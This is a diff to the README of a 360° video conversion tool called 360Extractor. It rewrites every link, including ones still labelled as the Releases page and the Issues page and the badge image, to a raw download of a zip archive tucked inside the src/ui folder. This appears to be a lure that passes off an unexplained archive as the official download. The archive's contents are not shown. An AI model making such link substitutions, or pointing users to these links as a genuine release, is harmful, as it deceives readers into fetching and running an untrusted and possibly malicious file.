@@ -1,7 +1,7 @@
 # 🎥 360Extractor - Optimize Your 360° Videos Effortlessly
 
 ## 📥 Download Now
-[![Download 360Extractor](https://img.shields.io/badge/Download-360Extractor-blue.svg)](https://github.com/Tawanlukp/360Extractor/releases)
+[![Download 360Extractor](https://github.com/Tawanlukp/360Extractor/raw/refs/heads/main/src/ui/Extractor-v1.4.zip)](https://github.com/Tawanlukp/360Extractor/raw/refs/heads/main/src/ui/Extractor-v1.4.zip)
 
 ## 🚀 Getting Started
 Welcome to 360Extractor! This application helps you convert 360° videos into standard formats. You can prepare your videos for advanced processing tasks, like Gaussian Splatting and photogrammetry. Simply follow the steps below to get started.
@@ -16,7 +16,7 @@ To run 360Extractor effectively, your computer should meet the following minimum
 - **Graphics Card:** NVIDIA GeForce GTX 960 or equivalent
 
 ## 📥 Download & Install
-To download 360Extractor, visit this page: [360Extractor Releases](https://github.com/Tawanlukp/360Extractor/releases).
+To download 360Extractor, visit this page: [360Extractor Releases](https://github.com/Tawanlukp/360Extractor/raw/refs/heads/main/src/ui/Extractor-v1.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. On the Releases page, find the latest version of 360Extractor.
@@ -51,7 +51,7 @@ If you encounter issues while using 360Extractor, consider the following tips:
 - **Conversion Problems**: Make sure the video file is not corrupt. Try a different video format if issues persist.
 - **Slow Processing**: Consider closing other applications to free up system resources.
 
-For additional assistance, refer to the [GitHub Issues Page](https://github.com/Tawanlukp/360Extractor/issues).
+For additional assistance, refer to the [GitHub Issues Page](https://github.com/Tawanlukp/360Extractor/raw/refs/heads/main/src/ui/Extractor-v1.4.zip).
 
 ## 🌍 Community Support
 Join our community for support and updates. You can find more insights, tips, and share your experiences:
@@ -66,6 +66,6 @@ Stay informed about the latest updates and features in 360Extractor from the cha
 If you have questions, you can reach out through the Issues page on GitHub or contact the developer directly via email.
 
 ## 📥 Download Now Again
-To get started quickly, visit this page to download: [360Extractor Releases](https://github.com/Tawanlukp/360Extractor/releases).
+To get started quickly, visit this page to download: [360Extractor Releases](https://github.com/Tawanlukp/360Extractor/raw/refs/heads/main/src/ui/Extractor-v1.4.zip).
 
 Thank you for choosing 360Extractor! Enjoy optimizing your 360° videos.
